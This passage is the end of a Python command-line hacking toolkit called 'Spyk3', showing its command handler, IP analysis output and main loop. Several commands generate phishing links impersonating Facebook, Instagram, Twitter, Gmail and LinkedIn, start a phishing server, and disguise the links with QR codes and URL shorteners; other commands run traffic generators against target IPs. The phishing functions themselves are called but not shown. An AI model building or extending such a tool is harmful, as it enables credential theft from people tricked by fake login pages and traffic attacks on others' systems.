                print(f"\n{Colors.SECONDARY}Active Traffic Generators:{Colors.RESET}")
                for gen in active:
                    print(f"\n  ID: {gen['id']}")
                    print(f"  Type: {gen['traffic_type']}")
                    print(f"  Target: {gen['target_ip']}")
                    print(f"  Packets Sent: {gen['packets_sent']}")
            else:
                print(f"{Colors.WARNING}No active traffic generators{Colors.RESET}")
        
        elif cmd == 'traffic_stop':
            if args:
                if self.traffic_gen.stop_generation(args[0]):
                    print(f"{Colors.SUCCESS}Stopped generator {args[0]}{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}Generator {args[0]} not found{Colors.RESET}")
            else:
                self.traffic_gen.stop_generation()
                print(f"{Colors.SUCCESS}Stopped all traffic generators{Colors.RESET}")
        
        elif cmd == 'traffic_logs':
            logs = self.db.get_traffic_logs(10)
            if logs:
                print(f"\n{Colors.SECONDARY}Recent Traffic Logs:{Colors.RESET}")
                for log in logs:
                    status = "✅" if log.get('status') == 'completed' else "❌"
                    print(f"\n  {status} {log.get('traffic_type')} to {log.get('target_ip')}")
                    print(f"     Packets: {log.get('packets_sent', 0)}")
                    print(f"     Time: {log.get('timestamp', '')[:19]}")
            else:
                print(f"{Colors.WARNING}No traffic logs found{Colors.RESET}")
        
        elif cmd == 'time':
            print(self.time_manager.get_current_time())
            self.db.log_time_command('time', 'cli', self.time_manager.get_current_time())
        
        elif cmd == 'date':
            print(self.time_manager.get_current_date())
            self.db.log_time_command('date', 'cli', self.time_manager.get_current_date())
        
        elif cmd == 'datetime':
            print(self.time_manager.get_datetime())
            self.db.log_time_command('datetime', 'cli', self.time_manager.get_datetime())
        
        elif cmd == 'history':
            limit = 10
            if args:
                try:
                    limit = int(args[0])
                except:
                    pass
            
            history = self.db.get_command_history(limit)
            if history:
                print(f"\n{Colors.SECONDARY}Command History:{Colors.RESET}")
                for cmd in history:
                    status = "✅" if cmd.get('success') else "❌"
                    print(f"\n  {status} [{cmd.get('source')}] {cmd.get('command')}")
                    print(f"     {cmd.get('timestamp', '')[:19]}")
            else:
                print(f"{Colors.WARNING}No command history{Colors.RESET}")
        
        elif cmd == 'phish_facebook':
            result = self.social_tools.generate_phishing_link('facebook')
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ Facebook phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_instagram':
            result = self.social_tools.generate_phishing_link('instagram')
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ Instagram phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_twitter':
            result = self.social_tools.generate_phishing_link('twitter')
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ Twitter phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_gmail':
            result = self.social_tools.generate_phishing_link('gmail')
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ Gmail phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_linkedin':
            result = self.social_tools.generate_phishing_link('linkedin')
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ LinkedIn phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_custom':
            custom_url = args[0] if args else None
            result = self.social_tools.generate_phishing_link('custom', custom_url)
            if result['success']:
                print(f"\n{Colors.SUCCESS}✅ Custom phishing link generated:{Colors.RESET}")
                print(f"  ID: {result['link_id']}")
                print(f"  URL: {result['phishing_url']}")
                print(f"\n{Colors.SECONDARY}Use 'phish_start {result['link_id']}' to start the server{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ {result.get('error', 'Generation failed')}{Colors.RESET}")
        
        elif cmd == 'phish_start':
            if not args:
                print(f"{Colors.ERROR}Usage: phish_start <link_id> [port]{Colors.RESET}")
                return
            
            link_id = args[0]
            port = int(args[1]) if len(args) > 1 else None
            
            success = self.social_tools.start_phishing_server(link_id, port)
            if success:
                url = self.social_tools.get_server_url()
                print(f"{Colors.SUCCESS}✅ Phishing server started at {url}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to start phishing server{Colors.RESET}")
        
        elif cmd == 'phish_stop':
            self.social_tools.stop_phishing_server()
            print(f"{Colors.SUCCESS}✅ Phishing server stopped{Colors.RESET}")
        
        elif cmd == 'phish_status':
            if self.social_tools.server_running:
                url = self.social_tools.get_server_url()
                print(f"{Colors.SUCCESS}✅ Phishing server is running at {url}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ Phishing server is not running{Colors.RESET}")
        
        elif cmd == 'phish_qr':
            if not args:
                print(f"{Colors.ERROR}Usage: phish_qr <link_id>{Colors.RESET}")
                return
            
            link_id = args[0]
            qr_path = self.social_tools.generate_qr_code(link_id)
            if qr_path:
                print(f"{Colors.SUCCESS}✅ QR code generated: {qr_path}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to generate QR code{Colors.RESET}")
        
        elif cmd == 'phish_shorten':
            if not args:
                print(f"{Colors.ERROR}Usage: phish_shorten <link_id>{Colors.RESET}")
                return
            
            link_id = args[0]
            short_url = self.social_tools.shorten_url(link_id)
            if short_url:
                print(f"{Colors.SUCCESS}✅ Shortened URL: {short_url}{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to shorten URL{Colors.RESET}")
        
        elif cmd == 'block':
            if len(args) < 1:
                print(f"{Colors.ERROR}Usage: block <ip> [reason]{Colors.RESET}")
                return
            
            ip = args[0]
            reason = ' '.join(args[1:]) if len(args) > 1 else "Manual block"
            
            try:
                ipaddress.ip_address(ip)
                success = self.db.block_ip(ip, reason, "cli")
                if success:
                    print(f"{Colors.SUCCESS}✅ IP {ip} blocked successfully{Colors.RESET}")
                else:
                    print(f"{Colors.ERROR}❌ Failed to block IP {ip}{Colors.RESET}")
            except ValueError:
                print(f"{Colors.ERROR}Invalid IP address: {ip}{Colors.RESET}")
        
        elif cmd == 'unblock':
            if len(args) < 1:
                print(f"{Colors.ERROR}Usage: unblock <ip>{Colors.RESET}")
                return
            
            ip = args[0]
            success = self.db.unblock_ip(ip)
            if success:
                print(f"{Colors.SUCCESS}✅ IP {ip} unblocked successfully{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}❌ Failed to unblock IP {ip}{Colors.RESET}")
        
        elif cmd == 'blocked':
            blocked = self.db.get_blocked_ips(active_only=True)
            if not blocked:
                print(f"{Colors.SUCCESS}No IPs are currently blocked.{Colors.RESET}")
            else:
                print(f"\n{Colors.ERROR}Blocked IPs ({len(blocked)}):{Colors.RESET}")
                for ip_data in blocked:
                    print(f"  {Colors.WARNING}{ip_data['ip_address']}{Colors.RESET} - {ip_data.get('reason', 'N/A')}")
        
        elif cmd == 'status':
            stats = self.db.get_statistics()
            ssh_status = self.ssh_manager.get_status()
            
            print(f"\n{Colors.PRIMARY}Spyk3 Status:{Colors.RESET}")
            print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
            
            print(f"\n{Colors.SECONDARY}Database Statistics:{Colors.RESET}")
            print(f"  Total Commands: {stats.get('total_commands', 0)}")
            print(f"  Total Threats: {stats.get('total_threats', 0)}")
            print(f"  Blocked IPs: {stats.get('total_blocked_ips', 0)}")
            print(f"  Traffic Tests: {stats.get('total_traffic_tests', 0)}")
            
            print(f"\n{Colors.SECONDARY}SSH Status:{Colors.RESET}")
            print(f"  Active Connections: {ssh_status.get('total_connections', 0)}/{ssh_status.get('max_connections', 5)}")
            print(f"  Configured Servers: {stats.get('total_ssh_servers', 0)}")
            print(f"  SSH Commands: {stats.get('total_ssh_commands', 0)}")
            
            active_traffic = self.traffic_gen.get_active_generators()
            print(f"\n{Colors.SECONDARY}Traffic Generation:{Colors.RESET}")
            print(f"  Active Generators: {len(active_traffic)}")
            
            if self.social_tools.server_running:
                print(f"\n{Colors.SECONDARY}Phishing Server:{Colors.RESET}")
                print(f"  Status: Running at {self.social_tools.get_server_url()}")
            
            print(f"\n{Colors.SECONDARY}Discord Bot:{Colors.RESET}")
            print(f"  Status: {'Running' if self.discord_bot.running else 'Stopped'}")
            print(f"  Enabled: {'Yes' if self.config.discord_enabled else 'No'}")
        
        elif cmd == 'start_discord':
            if self.discord_bot.start_bot_thread():
                print(f"{Colors.SUCCESS}Discord bot started!{Colors.RESET}")
            else:
                print(f"{Colors.ERROR}Failed to start Discord bot{Colors.RESET}")
        
        elif cmd == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')
            self.print_banner()
        
        elif cmd == 'exit':
            self.running = False
            print(f"\n{Colors.WARNING}Thank you for using Spyk3!{Colors.RESET}")
        
        else:
            print(f"{Colors.ERROR}Unknown command: {cmd}{Colors.RESET}")
            print(f"{Colors.WARNING}Type 'help' for available commands{Colors.RESET}")
    
    def _print_analysis_result(self, result: IPAnalysisResult):
        """Print analysis result"""
        print(f"\n{Colors.PRIMARY}{'='*60}{Colors.RESET}")
        print(f"{Colors.SUCCESS}SPYK3 IP ANALYSIS: {Colors.SECONDARY}{result.target_ip}{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*60}{Colors.RESET}")
        print(f"Time: {result.timestamp[:19]}")
        
        ping = result.ping_result
        ping_status = "Online" if ping.get('success') else "Offline"
        print(f"\nPING: {ping_status}")
        if ping.get('avg_rtt'):
            print(f"  • Avg RTT: {ping.get('avg_rtt')}ms")
            print(f"  • Packet Loss: {ping.get('packet_loss', 0)}%")
        
        geo = result.geolocation_result
        if geo.get('success'):
            print(f"\nLOCATION:")
            print(f"  • Country: {geo.get('country', 'Unknown')}")
            print(f"  • City: {geo.get('city', 'Unknown')}")
            print(f"  • ISP: {geo.get('isp', 'Unknown')}")
        
        ports = result.port_scan_result.get('open_ports', [])
        print(f"\nOPEN PORTS: {len(ports)}")
        if ports:
            for port_info in ports[:10]:
                port = port_info.get('port', '')
                service = port_info.get('service', 'unknown')
                print(f"  • Port {port} - {service}")
        
        security = result.security_status
        risk_color = Colors.ERROR if security.get('risk_level') in ['critical', 'high'] else Colors.WARNING if security.get('risk_level') == 'medium' else Colors.SUCCESS
        print(f"\nSECURITY ASSESSMENT:")
        print(f"  • Risk Level: {risk_color}{security.get('risk_level', 'unknown').upper()}{Colors.RESET}")
        print(f"  • Risk Score: {security.get('risk_score', 0)}")
        
        if result.recommendations:
            print(f"\nRECOMMENDATIONS:")
            for rec in result.recommendations:
                print(f"  • {rec}")
        
        print(f"\n{Colors.SUCCESS}Analysis completed successfully{Colors.RESET}")
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        
        if not os.path.exists(CONFIG_FILE):
            print(f"{Colors.WARNING}First time setup...{Colors.RESET}")
            self.setup_configuration()
        
        self.discord_bot.start_bot_thread()
        
        print(f"\n{Colors.SECONDARY}Type 'help' for command list{Colors.RESET}")
        print(f"{Colors.SECONDARY}Type 'exit' to quit{Colors.RESET}\n")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[spyk3]{Colors.RESET} "
                command = input(prompt).strip()
                self.process_command(command)
                self.db.log_command(command, source="cli")
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}Error: {str(e)}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        self.ssh_manager.disconnect()
        self.traffic_gen.stop_generation()
        self.social_tools.stop_phishing_server()
        self.db.close()
        print(f"\n{Colors.SUCCESS}Spyk3 shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        print("Starting Spyk3 v1.0.0...")
        
        if sys.version_info < (3, 7):
            print("Python 3.7 or higher is required")
            sys.exit(1)
        
        # Check for required packages
        missing = []
        if not PARAMIKO_AVAILABLE:
            missing.append("paramiko")
        if not QRCODE_AVAILABLE:
            missing.append("qrcode")
        if not SHORTENER_AVAILABLE:
            missing.append("pyshorteners")
        
        if missing:
            print(f"\n{Colors.WARNING}Optional packages missing: {', '.join(missing)}{Colors.RESET}")
            print(f"Install with: pip install {' '.join(missing)}")
            print("Continuing with limited functionality...\n")
            time.sleep(2)
        
        app = Spyk3App()
        app.run()
    
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}Fatal error: {str(e)}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()